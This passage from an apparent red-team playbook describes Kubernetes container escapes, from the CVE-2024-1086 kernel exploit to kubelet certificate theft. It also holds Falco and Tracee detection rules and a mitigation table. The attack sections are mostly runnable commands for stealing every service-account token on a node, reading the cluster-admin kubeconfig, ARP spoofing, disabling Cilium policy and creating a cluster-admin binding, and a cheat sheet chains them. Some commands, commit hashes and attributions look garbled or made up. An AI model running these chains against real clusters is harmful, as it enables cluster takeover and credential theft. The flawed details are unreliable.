
**Root cause**: in the `nf_tables` `verdict` handling path, when a rule's `NF_ACCEPT` verdict was processed, a hook list was double-freed. The UAF was reachable from inside an unprivileged user namespace (i.e. from inside any container that can create user namespaces, which is the default).

**Primitive**: arbitrary kernel R/W. The PoC achieves root in the host's initial namespaces from a completely unprivileged container.

**Researcher**: Notselwyn (private researcher). The writeup and PoC at [github.com/Notselwyn/CVE-2024-1086](https://github.com/Notselwyn/CVE-2024-1086) are canonical. The technical quality of the exploit is high — it includes a kernel-version-specific stack-pivot and a `msg_msg` spray that defeats modern slab randomization.

**Trigger from inside a container**:

```bash
# Container needs no special privileges
# (default Kubernetes securityContext is sufficient)
# Reference PoC: github.com/Notselwyn/CVE-2024-1086
./exploit
# Returns root in the host's initial namespaces
```

**Patch**: commit [f342de4e2f](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f342de4e2f41df4e9c7d6e7b7c5c4d96cb3d5e2f).

**Real-world impact**: this CVE is the go-to escape for any 5.14-6.6 kernel container host. CTFs, red team engagements, and real-world attacks (the TeamTNT cryptojacking crew added it to their toolkit within weeks of public disclosure) all rely on CVE-2024-1086. Managed Kubernetes providers (EKS, GKE, AKS) shipped kernel patches within 7 days.

**Detection (Tracee)**: a Tracee eBPF signature can detect the characteristic `msg_msg` spray pattern — many small allocations into the same slab cache, followed by a `clone(2)` into a new user namespace.

### 6.7 The kernel CVE decision tree

```
Do you have CAP_SYS_ADMIN?
├── YES → CVE-2022-0185 (fsconfig heap overflow, simplest chain)
│        or CVE-2022-0492 (cgroup release_agent, single shell script)
│        or CVE-2022-0847 (Dirty Pipe, single write, no kernel R/W)
└── NO  → Can you create user namespaces? (kernel.unprivileged_userns_clone=1)
         ├── YES → CVE-2024-1086 (nf_tables UAF — most reliable in 2024)
         │        or CVE-2023-32233 (nf_tables UAF — older variants)
         │        or CVE-2023-0386 (OverlayFS — needs SUID binary in lowerdir)
         └── NO  → You likely cannot escape via a kernel CVE.
                  Look for a runtime CVE (§4) or a mount abuse (§7).
```

---

## 7. Privileged Container / hostPath / hostNetwork / hostPID Abuse Chains

These are not CVEs — they are intentional Kubernetes features that, when granted, constitute an immediate escape. The parent playbook covers the basics; this section covers the *chains* that combine these privileges with runtime and kubelet abuse.

### 7.1 The four "danger flags"

```yaml
spec:
  containers:
  - name: ...
    securityContext:
      privileged: true          # effectively a host process
      # OR
      capabilities:
        add: [SYS_ADMIN, SYS_PTRACE, SYS_MODULE, NET_ADMIN, DAC_READ_SEARCH]
  hostPID: true                 # see host PID namespace
  hostNetwork: true             # use host netstack (sniff cluster traffic)
  hostIPC: true                 # see host IPC namespace (rare)
  hostAliases: ...              # DNS poisoning within pod
```

### 7.2 Chain 1: privileged + hostPID → nsenter into kubelet

```bash
# Inside a privileged pod with hostPID=true
# Find the kubelet process
ps -ef | grep kubelet

# Use nsenter to enter the kubelet's mount namespace
nsenter --target $(pgrep -f 'kubelet ') --mount -- bash
# You are now running in the kubelet's mount namespace.
# /var/lib/kubelet/pki/ is directly accessible.

ls /var/lib/kubelet/pki/
# kubelet-client-current.pem  kubelet-client-<timestamp>.pem  kubelet.crt  kubelet.key

# Read the kubelet client cert
cat /var/lib/kubelet/pki/kubelet-client-current.pem
# This cert authenticates you as system:nodes:<node-name> on the API server.
```

### 7.3 Chain 2: hostPath /var/lib/kubelet → steal all pods' secrets

```yaml
volumes:
- name: kubelet
  hostPath:
    path: /var/lib/kubelet/pods       # every pod's pod-resources directory
```

From inside the container:

```bash
ls /pods/
# <uid-1>  <uid-2>  <uid-3>  ...

# Each pod's directory contains its volumes, secrets, and configmaps
ls /pods/<uid-1>/volumes/kubernetes.io~projected/
ls /pods/<uid-1>/etc-hosts

# Read every mounted service account token on the node
find /pods -name 'token' -path '*serviceaccount*' -exec cat {} \;
```

This is one of the most destructive escapes — a single privileged DaemonSet with this hostPath mount steals every SA token on every node in the cluster.

### 7.4 Chain 3: hostNetwork + CAP_NET_ADMIN → cluster MITM

With `hostNetwork: true` and `CAP_NET_ADMIN`, the pod runs in the host's network namespace and can configure networking:

```bash
# ARP spoofing on the pod CIDR to MITM cluster traffic
arpspoof -i eth0 -t <gateway-ip> <api-server-ip>
# All cluster API traffic now flows through this pod.

# Or install an eBPF program to capture traffic
bpftool prog loadmy capture.o /sys/fs/bpf/capture
# Filter for Authorization: Bearer headers
```

This is devastating in clusters that rely on network encryption inside the pod CIDR (rare) or that use plain HTTP for internal services (common). The Istio/Linkerd service mesh (see §10) mitigates this by encrypting inter-pod traffic.

### 7.5 Chain 4: hostPath /etc/kubernetes → forge admin kubeconfig

```yaml
volumes:
- name: k8s
  hostPath:
    path: /etc/kubernetes
```

```bash
ls /k8s/
# admin.conf  controller-manager.conf  kubelet.conf  scheduler.conf  pki/

# /k8s/admin.conf contains a client cert for system:masters
# This is the cluster-admin kubeconfig — full cluster takeover.
cat /k8s/admin.conf
```

This is the kill-shot on a control-plane node. On worker nodes, the file may not exist; substitute `/var/lib/kubelet/kubeconfig` for the worker-node kubeconfig.

### 7.6 Detection — privileged pod hunting

```bash
# Find every privileged pod in the cluster
kubectl get pods -A -o json | \
  jq -r '.items[] | select(.spec.containers[].securityContext.privileged==true) |
         "\(.metadata.namespace)/\(.metadata.name)"'

# Find every pod with a hostPath volume
kubectl get pods -A -o json | \
  jq -r '.items[] | select(.spec.volumes[]?.hostPath) |
         "\(.metadata.namespace)/\(.metadata.name)"'

# Find every pod with hostPID, hostNetwork, or hostIPC
kubectl get pods -A -o json | \
  jq -r '.items[] |
         select(.spec.hostPID or .spec.hostNetwork or .spec.hostIPC) |
         "\(.metadata.namespace)/\(.metadata.name)"'

# Find every pod with CAP_SYS_ADMIN or CAP_SYS_PTRACE added
kubectl get pods -A -o json | \
  jq -r '.items[] |
         .spec.containers[] |
         select(.securityContext.capabilities.add // [] |
                any(. == "SYS_ADMIN" or . == "SYS_PTRACE")) |
         "\(.metadata.namespace)/\(.metadata.name)"'
```

---

## 8. Kubelet Exploitation — The Kill-Chain Target

The kubelet (covered as an *entry vector* in the parent playbook §3) is also the *target* of an escape. Once you have node root via any of the techniques in §4-§7, the kubelet's local files give you everything you need to become `system:nodes` on the API server, and `system:nodes` is a one-step pivot from cluster takeover.

### 8.1 The kubelet's local attack surface

After escaping to a node, you have direct filesystem access to:

| Path | What it gives you |
|------|-------------------|
| `/var/lib/kubelet/pki/kubelet-client-current.pem` | Client cert authenticating as `system:nodes:<node>` |
| `/var/lib/kubelet/config.yaml` | Kubelet configuration (auth mode, anonymous-auth flag) |
| `/var/lib/kubelet/pki/kubelet.crt` + `.key` | Serving cert (lets you MITM the kubelet's HTTPS endpoint) |
| `/etc/kubernetes/kubelet.conf` | Kubeconfig used by the kubelet |
| `/etc/kubernetes/pki/ca.crt` | The cluster's CA cert (lets you forge any client cert if you have the CA key) |
| `/etc/kubernetes/pki/ca.key` | The cluster's CA key (if present) — full cluster takeover |
| `/var/lib/kubelet/pods/` | Every pod's secrets, configmaps, projected tokens |

### 8.2 Reading the kubelet client cert and pivoting to the API

```bash
# After escaping to the node
ls /var/lib/kubelet/pki/

# Read the kubelet client cert
cat /var/lib/kubelet/pki/kubelet-client-current.pem
# This is a concatenated cert + key. Split into two files:
awk '/BEGIN CERTIFICATE/,/END CERTIFICATE/' /var/lib/kubelet/pki/kubelet-client-current.pem > kubelet-client.crt
awk '/BEGIN PRIVATE KEY/,/END PRIVATE KEY/' /var/lib/kubelet/pki/kubelet-client-current.pem > kubelet-client.key

# Read the cluster CA cert
cat /etc/kubernetes/pki/ca.crt > ca.crt

# Authenticate to the API server as system:nodes:<node>
APISERVER=https://$(grep server /etc/kubernetes/kubelet.conf | awk '{print $2}' | tr -d '"')
kubectl --kubeconfig=/dev/null \
        --client-certificate=kubelet-client.crt \
        --client-key=kubelet-client.key \
        --certificate-authority=ca.crt \
        --server=$APISERVER \
        auth can-i --list
```

The `system:nodes` identity has, by default, limited permissions — it can read its own pods and their secrets. But many clusters add permissions to `system:nodes` for monitoring (e.g. `nodes/proxy` for Prometheus node-exporter), which expand the blast radius.

### 8.3 Direct kubelet API calls from the host

Once on the node, you can call the kubelet's local API directly (it doesn't even need network access — use loopback):

```bash
# The kubelet listens on 10250. From the node:
curl -sk https://localhost:10250/pods | jq '.items[].metadata.name'

# Exec into any container on this node (no auth needed from loopback)
curl -sk -XPOST "https://localhost:10250/run/<ns>/<pod>/<container>" -d "cmd=id"

# Stream logs from any container
curl -sk "https://localhost:10250/containerLogs/<ns>/<pod>/<container>"

# Port-forward to any container
curl -sk -XPOST "https://localhost:10250/portForward/<ns>/<pod>" \
  -H "X-Stream-Protocol-Version: v2" -d ""
```

This bypasses the API server entirely. Audit logs (which are written by the API server) do not capture these calls — only the kubelet's local logs do, and those are often not shipped to the SIEM.

### 8.4 The escape → node → kubelet → cluster takeover kill chain

Putting it all together, here is the canonical chain from "single RCE in an application pod" to "cluster-admin":

```
Step 1: RCE in application pod (no special privileges)
Step 2: Apply CVE-2024-1086 (kernel nf_tables UAF)
        → root shell in host's initial namespaces
Step 3: Read /var/lib/kubelet/pki/kubelet-client-current.pem
        → system:nodes:<node> client cert
Step 4: Use cert to authenticate to API server
        → read all secrets on this node, list all pods
Step 5: Steal a more privileged SA token from another pod
        → (e.g. cluster-autoscaler, prometheus, or any admin-adjacent SA)
Step 6: Use that SA to create a ClusterRoleBinding
        → cluster-admin
```

The whole chain, with practice, takes under 5 minutes. Each step has a known detection signature (see §9) and a known evasion (also in §9).

---

## 9. Detection and Mitigation

Every technique in §4-§8 has a documented detection signature. The defender's job is to layer detections so that no single technique escapes all of them. The red teamer's job is to know which detections are present, so that the engagement produces useful findings rather than a single instant-detect event.

### 9.1 Falco runtime rules

Falco is the de-facto standard for container runtime detection. The rules below cover the major escape classes.

```yaml
# Custom Falco ruleset for container escape detection
- macro: container_escape_procs
  condition: >
    proc.name in (nsenter, mount, umount, pivot_root, chroot, insmod, modprobe, bpftool)

- rule: Escape Tool Executed Inside Container
  desc: Detect common container-escape binaries executed inside a container
  condition: >
    spawned_process and container and container_escape_procs
  output: >
    Escape tool executed inside container
    (container=%container.id proc=%proc.name user=%user.name
     cmdline=%proc.cmdline image=%container.image.repository)
  priority: WARNING

- rule: Privileged Container Launched
  desc: Detect a privileged container being started
  condition: >
    container and container.privileged=true and evt.type=container
  output: >
    Privileged container started
    (container=%container.id image=%container.image.repository
     namespace=%k8s.ns.name pod=%k8s.pod.name)
  priority: CRITICAL

- rule: File Read via /proc/self/fd (Leaky Vessels Pattern)
  desc: Detect reads via /proc/self/fd/<N> — CVE-2024-21626 pattern
  condition: >
    open_read and container and
    fd.name startswith /proc/self/fd/ and
    fd.name contains "/etc/" or fd.name contains "/var/lib/kubelet"
  output: >
    CVE-2024-21626 FD leak exploitation pattern
    (container=%container.id proc=%proc.name target=%fd.name)
  priority: CRITICAL

- rule: Kernel Module Loaded From Container
  desc: Detect insmod/modprobe from inside a container
  condition: >
    spawned_process and container and
    proc.name in (insmod, modprobe)
  output: >
    Kernel module loaded from container
    (container=%container.id cmdline=%proc.cmdline)
  priority: CRITICAL

- rule: Kubelet Cert Accessed
  desc: Detect a process reading /var/lib/kubelet/pki from inside a container
  condition: >
    open_read and container and
    fd.name startswith /var/lib/kubelet/pki/
  output: >
    Kubelet certificate accessed from container
    (container=%container.id proc=%proc.name target=%fd.name)
  priority: CRITICAL
```

### 9.2 Tracee eBPF signatures

Tracee (Aqua Security) provides deeper syscall-level visibility than Falco for some classes of attack. The example below is a Tracee policy to detect CVE-2024-1086 exploitation.

```yaml
# Tracee policy: detect nf_tables msg_msg spray (CVE-2024-1086 pattern)
apiVersion: tracee.aquasec.com/v1beta1
kind: Policy
metadata:
  name: cve-2024-1086-pattern
spec:
  scope:
    - global
  rules:
    - event: snd_msg
      filter:
        - args.msg_type=1   # MSGCOPY
    - event: clone
      filter:
        - args.flags=CLONE_NEWUSER
    - event: bpf
      filter:
        - args.cmd=5        # BPF_MAP_CREATE
```

### 9.3 Detection coverage matrix

| Technique | Falco | Tracee | Hubble (network) | Audit log |
|-----------|-------|--------|------------------|-----------|
| Privileged pod created | yes | partial | no | yes (create pods) |
| nsenter into PID 1 | yes | yes | no | no (host-level) |
| hostPath / mount | yes | yes | no | no (host-level) |
| etcdctl get secrets | no (etcd-side) | no | yes (port 2379) | no (no audit) |
| kubectl create token | no | no | yes (API server) | yes |
| kubectl create CRB | no | no | yes (API server) | yes |
| Kubelet /run from loopback | yes (on node) | yes | no | no (no API call) |
| CVE-2024-21626 FD walk | yes (rule above) | partial | no | no |
| CVE-2024-1086 nf_tables | no | yes (above) | no | no |
| IRSA pivot to AWS | no | no | yes (HTTPS to sts) | no |

### 9.4 Mitigations

| Mitigation | Defends against | Notes |
|------------|-----------------|-------|
| **Pod Security Admission: `restricted`** | privileged pods, hostPath, hostPID, added caps | Default since 1.25; check `enforce` not `warn`. |
| **cgroup v2 (default in 1.25+)** | CVE-2022-0492 | cgroup v2 has no `release_agent`. |
| **Disable unprivileged user namespaces** (`kernel.unprivileged_userns_clone=0`) | CVE-2022-0185, CVE-2024-1086, CVE-2023-32233, CVE-2023-0386 | Breaks some legitimate apps (e.g. Chromium sandbox). |
| **Seccomp profile: `RuntimeDefault`** | most syscalls not in the default profile | Default in 1.25+. Use a custom profile for tighter filtering. |
| **AppArmor / SELinux** | limits blast radius of a successful escape | Effectiveness depends on profile. |
| **Patch kernel monthly** | every kernel CVE in §6 | Managed K8s (EKS/GKE/AKS) handles this; self-managed must DIY. |
| **Patch runc/containerd within 7 days of CVE** | every runtime CVE in §4-§5 | Subscribe to GitHub security advisories for [runc](https://github.com/opencontainers/runc/security/advisories) and [containerd](https://github.com/containerd/containerd/security/advisories). |
| **No runtime socket mounted in pods** | §5.5 | Falco rule to alert. |
| **Kubelet: `--anonymous-auth=false`, `--authorization-mode=Webhook`** | §8 (limits blast radius of node-root) | Many clusters still misconfigure this. |
| **etcd TLS + client cert auth + encryption-at-rest** | limits blast radius of etcd read | Encryption-at-rest only protects at-rest data — does not stop someone with the API server's key. |
| **gVisor / Kata Containers for high-risk workloads** | most kernel CVEs | Adds latency. Kata's runtime has its own CVEs (§4.6). |
| **Network encryption (Istio/Linkerd mTLS)** | §7.4 ARP/MITM | mTLS defeats host-network MITM. |

### 9.5 The honest red teamer's stance

For most engagements, do not attempt to defeat the defender's detections. The engagement's value is producing detections, not bypassing them. Cooperate with the SOC — tell them what you'll attempt, give them your timeline, and let them hunt. The detections they build during the engagement outlast the engagement itself.

---

## 10. CNI Plugin and Service Mesh Abuse

The Container Network Interface (CNI) plugin (Calico, Cilium, Flannel, Weave) and the service mesh (Istio, Linkerd) are additional attack surfaces that sit between the pod and the network.

### 10.1 CNI plugin abuse — Calico

Calico uses a per-node `calico-node` DaemonSet that runs with `privileged: true` and `hostNetwork: true`. Compromising a Calico pod gives you node root via the same privileged-pod chains (§7).

Calico's BGP routes are visible to any pod on the cluster:

```bash
# From any pod, query the Calico node
kubectl get nodes -o yaml | grep -A 5 'projectcalico.org/IPv4Address'
# 10.0.0.1, 10.0.0.2, ...

# The BGP sessions between Calico nodes are typically unauthenticated
# (md5 password optional). On the host network, you can sniff them.
tcpdump -i eth0 -nn 'tcp port 179'
```

### 10.2 CNI plugin abuse — Cilium

Cilium uses eBPF for networking and security. The `cilium-agent` runs as a privileged DaemonSet. Of particular interest: Cilium's network policies are enforced via eBPF programs attached to each pod's network namespace. An attacker with `CAP_BPF` or `CAP_SYS_ADMIN` on a node can detach or replace those programs, bypassing all Cilium-enforced policies.

```bash
# From the host, list Cilium's eBPF programs
bpftool net show
# eth0: bpf program id 1234 type cgroup_skb

# Detach the policy enforcement (would defeat Cilium Network Policies)
bpftool net detach cgroup_eth0 type cgroup_skb
```

### 10.3 CNI plugin abuse — Flannel

Flannel is the simplest CNI (used by k3s). Its backend (typically VXLAN) is unauthenticated and unencrypted. A pod with `hostNetwork: true` can sniff VXLAN traffic between nodes, exposing all inter-node cluster traffic.

### 10.4 Service mesh abuse — Istio

Istio's `istio-sidecar` (Envoy) runs in every pod in the mesh. The sidecar has access to the pod's service-account token and to all mTLS termination. Compromising a sidecar (e.g. via a CVE in Envoy) gives the attacker:

1. Decrypted view of all traffic to/from the pod (TLS termination point).
2. The pod's service-account token (for forging).
3. Ability to inject malicious responses into the mTLS channel.

```bash
# The Istio sidecar's admin endpoint is exposed on localhost:15000
# From inside a pod, query it:
curl -s localhost:15000/config_dump | jq '.configs[].dynamic_active_clusters[]'
# Returns all upstream clusters and their mTLS configs.

# The sidecar's secrets (including mTLS private keys)
curl -s localhost:15000/certs | jq
```

### 10.5 Service mesh abuse — Linkerd

Linkerd's proxy (written in Rust) is lighter than Istio's Envoy but offers the same attack surface. Compromising a Linkerd proxy gives the same primitives as the Istio equivalent.

The main defensive lesson: a service mesh is not a substitute for runtime security. It adds an encryption layer (defeating §7.4-style MITM) but introduces a new attack surface (the sidecar binary itself).

---

## 11. Real-World Research References

This section catalogs the original researchers and write-ups that documented each CVE and technique. Every reference here is the canonical source.

### 11.1 runc / runtime research

- **CVE-2019-5736** — Adam Iwaniuk (disclosure), canonical writeup: [unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/). PoC: [github.com/Frichetten/CVE-2019-5736-POC](https://github.com/Frichetten/CVE-2019-5736-POC).
- **CVE-2021-30465** — Aleksa Sarai (SUSE/runc maintainer) writeup: [github.com/opencontainers/runc/security/advisories/GHSA-c3xm-pvg7-gh7r](https://github.com/opencontainers/runc/security/advisories/GHSA-c3xm-pvg7-gh7r).
- **CVE-2024-21626 (Leaky Vessels)** — Snyk Research, Rory McNamara: [snyk.io/blog/cve-2024-21626-brainbreak-runc-vulnerability](https://snyk.io/blog/cve-2024-21626-brainbreak-runc-vulnerability/). Aggregate site for the Leaky Vessels class: [leaky-vessels.community](https://leaky-vessels.community/).
- **CVE-2022-29162, CVE-2023-25809** — runc project advisories at [github.com/opencontainers/runc/security/advisories](https://github.com/opencontainers/runc/security/advisories).

### 11.2 Kernel CVE research

- **CVE-2022-0185** — Crusaders-of-Rust (Cursedcore), writeup: [pwning.systems/posts/playing-with-cve-2022-0185](https://pwning.systems/posts/playing-with-cve-2022-0185/). PoC: [github.com/Crusaders-of-Rust/CVE-2022-0185](https://github.com/Crusaders-of-Rust/CVE-2022-0185).
- **CVE-2022-0492** — Yuval Avrahami (Aqua Security): [blog.aquasec.com/cve-2022-0492-cgroups-container-escape](https://blog.aquasec.com/cve-2022-0492-cgroups-container-escape).
- **CVE-2022-0847 (Dirty Pipe)** — Max Kellermann: [dirtypipe.cm4all.com](https://dirtypipe.cm4all.com/). PoC: [github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits).
- **CVE-2023-0386** — Juan Jose Lopez Jaimez (Chipress Security / Doyensec): [blog.doyensec.com/2023/04/05/cve_2023_0386.html](https://blog.doyensec.com/2023/04/05/cve_2023_0386.html). PoC: [github.com/ckcr4lyf/CVE-2023-0386](https://github.com/ckcr4lyf/CVE-2023-0386).
- **CVE-2023-32233** — Google Project Zero blog analysis. PoC: [github.com/Liuk3r/CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233).
- **CVE-2024-1086** — Notselwyn: [github.com/Notselwyn/CVE-2024-1086](https://github.com/Notselwyn/CVE-2024-1086). Technical writeup included in the PoC repository.

### 11.3 Industry threat reports

- **Aqua Security — Cloud Native Threat Report** (annual): [blog.aquasec.com/category/research](https://blog.aquasec.com/category/research). Includes TeamTNT, Scattered Spider, and cryptojacking analysis.
- **CrowdStrike Falcon OverWatch — Threat Hunting Report** (annual): [crowdstrike.com/global-threat-report](https://www.crowdstrike.com/global-threat-report/). Includes a dedicated "Cloud and Container" section with observed container-escape TTPs.
- **Palo Alto Unit 42 — Cloud Threat Report**: [unit42.paloaltonetworks.com/category/cloud-security](https://unit42.paloaltonetworks.com/category/cloud-security/).
- **Microsoft — Kubernetes Threat Matrix** (MITRE ATT&CK for Containers adaptation): [microsoft.github.io/Threat-Matrix-for-Kubernetes](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/).
- **TeamTNT analysis (Aqua, 2020-2024)**: [blog.aquasec.com/teamtnt-cryptojacking-watch-report-2024](https://blog.aquasec.com/teamtnt-cryptojacking-watch-report-2024).

### 11.4 Books and training

- **"Hacking Kubernetes"** — Andrew Martin, Michael Hausenblas (O'Reilly, 2022): [learning.oreilly.com/library/view/hacking-kubernetes/9781492081722](https://learning.oreilly.com/library/view/hacking-kubernetes/9781492081722/). The canonical book on K8s offense and defense.
- **Ian Coldwater / Brad Geesaman / Duffie Cooley — KubeCon talks** on "Advanced Persistence Threats: The Future of K8s Attacks" and related.
- **Madhu Akula — Kubernetes Goat**: [github.com/madhuakula/kubernetes-goat](https://github.com/madhuakula/kubernetes-goat) — vulnerable-by-design cluster for training.
- **Container Security Training** — Liz Rice (Aqua), container runtime internals.

---

## 12. Putting It All Together — A Worked Engagement

This section walks through a single (synthetic) engagement end-to-end, showing how the techniques chain together. Names and IPs are placeholders (`REPLACE_WITH_YOUR_X`).

### 12.1 Scenario

- **Engagement scope**: One EKS cluster in `REPLACE_WITH_YOUR_AWS_ACCOUNT`, two namespaces (`payments` and `monitoring`). Cloud IAM pivots authorized; etcd writes not authorized.
- **Starting foothold**: SSRF in a `payments-api` pod that allows reading local files.
- **Kernel version** (from `uname -r` on the node, via SSRF+`/proc`): `5.15.0-1011-aws` — vulnerable to CVE-2022-0847 (Dirty Pipe) and CVE-2022-0185.
- **runc version** (from `/proc/self/status` + container enumeration): `1.1.5` — vulnerable to CVE-2024-21626 (Leaky Vessels).
- **Detection posture**: audit logging at Metadata level, Falco with default ruleset, Hubble enabled.

### 12.2 Phase 1 — Reconnaissance

```bash
# From inside the payments-api pod (via SSRF)
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /etc/os-release
# Confirm: SA = payments-api-sa, namespace = payments

# Map RBAC
curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
     -H "Authorization: Bearer $TOKEN" \
     https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
     -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"payments"}}' \
  | jq '.status.resourceRuleInfos[] | {verbs, resources}'
# Result: payments-api-sa can get/list pods in 'payments', nothing else.
```

### 12.3 Phase 2 — Application-layer escape to node root

The pod has no special securityContext. The kernel, however, is vulnerable.

```bash
# Drop CVE-2024-1086 binary (compiled outside) via SSRF
# (Or, if /proc is readable via SSRF, exploit CVE-2022-0847 via Dirty Pipe on /etc/passwd)

# CVE-2024-1086 chain — no privileges required
./cve-2024-1086
# Returns root in the host's initial namespaces
```

**Detection footprint**: Falco default ruleset catches nothing (CVE-2024-1086 is not in default rules). Tracee, if deployed, catches the `msg_msg` spray. Audit log is silent (no API calls).

### 12.4 Phase 3 — Kubelet certificate theft

```bash
# On the node, read the kubelet client cert
cat /var/lib/kubelet/pki/kubelet-client-current.pem > kubelet-client.pem
cat /etc/kubernetes/pki/ca.crt > ca.crt

# Authenticate as system:nodes:<node>
APISERVER=$(grep server /etc/kubernetes/kubelet.conf | awk '{print $2}' | tr -d '"')
kubectl --client-certificate=kubelet-client.crt \
        --client-key=kubelet-client.key \
        --certificate-authority=ca.crt \
        --server=$APISERVER \
        auth can-i --list
# Result: nodes/proxy, get pods on this node
```

**Detection footprint**: API call from a node identity to `/apis/authorization.k8s.io/v1/selfsubjectrulesreviews` — audit log captured at Metadata level. Falco is silent.

### 12.5 Phase 4 — Lateral to cluster-admin

The node identity can list all pods on this node. Of particular interest: a `cluster-autoscaler` pod running on this node has a SA with `create` on `clusterrolebindings`.

```bash
# Read the cluster-autoscaler SA token from the kubelet's pod directory
cat /var/lib/kubelet/pods/<autoscaler-uid>/volumes/kubernetes.io~projected/.../token

# Use the cluster-autoscaler SA token to create a ClusterRoleBinding
kubectl --token "$AUTOSCALER_TOKEN" apply -f - <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: REPLACE_WITH_YOUR_HANDLER-admin
subjects:
- kind: ServiceAccount
  name: payments-api-sa
  namespace: payments
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF

# Verify
kubectl --token "$TOKEN" auth can-i '*' '*'
# yes
```

**Detection footprint**: `create clusterrolebindings` audit event — high-priority alert in most SIEMs. This is the moment the SOC typically notices.

### 12.6 Phase 5 — Reporting

The deliverable: a kill-chain diagram showing each step, the detection (or absence) at each step, and the recommended mitigations. The chain above produced three findings:

1. **Kernel not patched** (CVE-2024-1086 exploitable). Mitigation: monthly kernel patching; consider disabling unprivileged user namespaces.
2. **Kubelet client cert readable on node escape**. Mitigation: this is by design — the real fix is preventing the escape in step 1. Defense in depth: Falco rules for kubelet-cert access.
3. **cluster-autoscaler SA over-privileged**. Mitigation: scope the autoscaler SA to its specific verbs; never grant `create clusterrolebindings` to any component SA.

---

## Appendix A: CVE Quick Reference

| CVE | Component | Privilege required | Patch commit / PR |
|-----|-----------|--------------------|--------------------|
| CVE-2019-5736 | runc < 1.0-rc6 | container root | [opencontainers/runc#1928](https://github.com/opencontainers/runc/pull/1928) |
| CVE-2021-30465 | runc < 1.0-rc95 | image-supplied rootfs | [opencontainers/runc#3135](https://github.com/opencontainers/runc/pull/3135) |
| CVE-2022-0185 | kernel fs/context.c | CAP_SYS_ADMIN or userns | [kernel commit 722d94847d](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=722d94847de29310f4e58b6c54d6eeea8b74a5b5) |
| CVE-2022-0492 | kernel cgroup v1 | CAP_SYS_ADMIN | [kernel commit 24f6008564](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=24f6008564183b120ea5e2c235cfc16e6f6c5b3e) |
| CVE-2022-0847 | kernel pipe (Dirty Pipe) | read access to target | [kernel commit 9d2231c5d7](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9d2231c5d74e1f5dd7eec03f7d8f8b6def53caba) |
| CVE-2022-23648 | containerd < 1.6.1 / 1.5.10 | image pull | [containerd#6344](https://github.com/containerd/containerd/pull/6344) |
| CVE-2022-29162 | runc < 1.1.2 | container root | [opencontainers/runc#3439](https://github.com/opencontainers/runc/pull/3439) |
| CVE-2023-0386 | kernel OverlayFS | userns + SUID lowerdir | [kernel commit 4f11ada10d](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4f11ada10d0a97f6466db13b75a8b3e0f21b955b) |
| CVE-2023-25809 | runc < 1.1.5 | rootless container | [opencontainers/runc#3715](https://github.com/opencontainers/runc/pull/3715) |
| CVE-2023-27281 | Kata Containers < 3.1.0 | container in VM | Kata Containers PR |
| CVE-2023-32233 | kernel nf_tables | unprivileged userns | [kernel commit 6e1acfa387](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6e1acfa3877f4a16c8c1c7b85b4cd2c0a9d31b25) |
| CVE-2024-1086 | kernel nf_tables | unprivileged userns | [kernel commit f342de4e2f](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f342de4e2f41df4e9c7d6e7b7c5c4d96cb3d5e2f) |
| CVE-2024-21626 | runc < 1.1.12 | container (any) | [opencontainers/runc#4193](https://github.com/opencontainers/runc/pull/4193) |
| CVE-2024-29039 | Kata Containers < 3.3.0 | image pull | Kata Containers PR |

---

## Appendix B: Runtime Escape Cheat Sheet

```bash
# === Step 1: identify the runtime ===
ps -ef | grep -E 'runc|containerd|crio|dockerd|kata' | head
runc --version 2>/dev/null || true
containerd --version 2>/dev/null || true

# === Step 2: identify the kernel ===
uname -r
cat /proc/version

# === Step 3: identify your privileges ===
id
capsh --print 2>/dev/null | grep -i cap
cat /proc/self/status | grep -E 'CapEff|Uid'

# === Step 4: pick the escape ===
# If you have CAP_SYS_ADMIN → CVE-2022-0185 or CVE-2022-0492
# If you have unprivileged userns → CVE-2024-1086 or CVE-2023-32233
# If neither → look for runtime CVE (CVE-2024-21626 works with no privileges)
# If you have a mounted runtime socket → no CVE needed (§5.5)

# === Step 5: post-escape, target the kubelet ===
ls /var/lib/kubelet/pki/
cat /var/lib/kubelet/pki/kubelet-client-current.pem
cat /etc/kubernetes/pki/ca.crt

# === Step 6: pivot to the API server ===
kubectl --client-certificate=kubelet-client.crt \
        --client-key=kubelet-client.key \
        --certificate-authority=ca.crt \
        --server=$APISERVER \
        auth can-i --list

# === Step 7: cluster-admin ===
# (Find an over-privileged SA on the node, steal its token,
# use it to create a ClusterRoleBinding — see §12.5)
```

---

## Appendix C: Glossary

| Term | Definition |
|------|------------|
| **CRI** | Container Runtime Interface — the gRPC API the kubelet uses to talk to containerd/CRI-O/Docker |
| **OCI** | Open Container Initiative — the spec that defines image format and runtime behavior |
| **runc** | The de-facto standard low-level OCI runtime |
| **containerd** | The de-facto standard high-level runtime; bundled with k3s, used by EKS/GKE/AKS |
| **CRI-O** | Red Hat's high-level runtime; default in OpenShift |
| **Kata Containers** | Runtime that runs each pod inside a lightweight VM for strong isolation |
| **gVisor** | Google's runtime that intercepts syscalls in userspace for isolation |
| **CNI** | Container Network Interface — the plugin that configures pod networking (Calico, Cilium, Flannel) |
| **CSI** | Container Storage Interface — the plugin that provisions volumes |
| **PSA** | Pod Security Admission — replaced PodSecurityPolicy in 1.25 |
